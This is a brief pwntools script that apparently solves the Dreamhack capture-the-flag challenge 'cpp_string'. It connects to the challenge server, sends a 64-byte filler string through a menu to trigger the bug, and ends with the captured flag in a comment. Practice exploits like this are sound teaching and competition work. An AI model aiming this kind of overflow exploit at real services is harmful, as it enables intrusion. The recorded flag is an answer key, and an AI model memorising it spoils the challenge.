from pwn import *

# p = process("./cpp_string")
p = remote("host1.dreamhack.games",8496)

p.sendlineafter("input : ",str(2))
p.sendlineafter("contents : ","a"*64)

p.sendlineafter("input : ",str(1))

p.interactive()

#DH{549390a9beb20a8d0e9a6aa0efcb571f}